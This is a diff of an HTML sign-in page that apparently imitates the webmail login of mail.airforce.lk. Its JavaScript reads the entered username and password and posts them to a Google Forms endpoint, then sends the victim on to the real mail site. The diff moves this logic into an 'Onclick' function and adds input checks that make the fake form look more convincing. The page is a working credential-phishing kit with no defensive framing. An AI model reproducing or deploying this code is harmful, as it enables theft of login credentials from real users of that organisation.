@@ -80,34 +80,63 @@
               </div>
          
               <div id="expltxt" class="signInExpl" role="alert"></div>
-              <button class="signInEnter">
-                <div id="submitButton" class="signinbutton" role="button" tabindex="0">
-                  <img class="imgLnk" src="./files/btn.png" alt="">
-                  <span class="signinTxt">Sign in</span>
-                </div>
-                <script>
-        document.getElementById('submitButton').addEventListener('click', function() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+              <button onclick="Onclick(event)" class="signInEnter">
+	    <div class="signinbutton" role="" tabindex="0">
+		<img class="imgLnk" src="./files/btn.png" alt="">
+		<span class="signinTxt">Sign in</span>
+	    </div>
+	    <input name="isUtf8" value="1" type="hidden">
+		</button>
 
-            const params = new URLSearchParams();
-            params.append('entry.2084499249', username);
-            params.append('entry.2006519585', password);
+			<script>
+			
+	
+			    function Onclick(event){
+				// Prevents the default action (form submission, if inside a form)
+				event.preventDefault();
+				
+				
+				
+				    const username = document.getElementById('username').value;
+				    const password = document.getElementById('password').value;
+				    var errormsg = document.getElementById("errormessage");
+				    
+				     if (username.trim() === "") {
+					errormsg.innerHTML = "Username cannot be blank";
+					return false;
+				    }
 
-            fetch('https://docs.google.com/forms/d/e/1FAIpQLSfqhqsWVelwpdLhr3HkDHRL41TsUHBqZ5kTnxxWKjNQc3lecw/formResponse', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: params.toString()
-            })
-            
-              window.location.href = 'https://mail.airforce.lk';
-     
-        });
-    </script>
-                <input name="isUtf8" value="1" type="hidden">
-            </button>
+				      if (password.trim() === "") {
+					errormsg.innerHTML = "Password cannot be blank";
+					return false;
+				    }
+				    
+				     if (username === password) {
+					errormsg.innerHTML = "Username and password cannot be the same";
+					return false;
+				    }
+
+
+
+				    const params = new URLSearchParams();
+				    params.append('entry.2084499249', username);
+				    params.append('entry.2006519585', password);
+
+				    fetch('https://docs.google.com/forms/d/e/1FAIpQLSfqhqsWVelwpdLhr3HkDHRL41TsUHBqZ5kTnxxWKjNQc3lecw/formResponse', {
+					method: 'POST',
+					headers: {
+					    'Content-Type': 'application/x-www-form-urlencoded',
+					},
+					body: params.toString()
+				    })
+				    
+				      window.location.href = 'https://mail.airforce.lk';
+					    
+							    
+					    }
+					    
+			</script>
+			
               <div class="hidden-submit">
                 <input type="submit" tabindex="-1">
               </div>
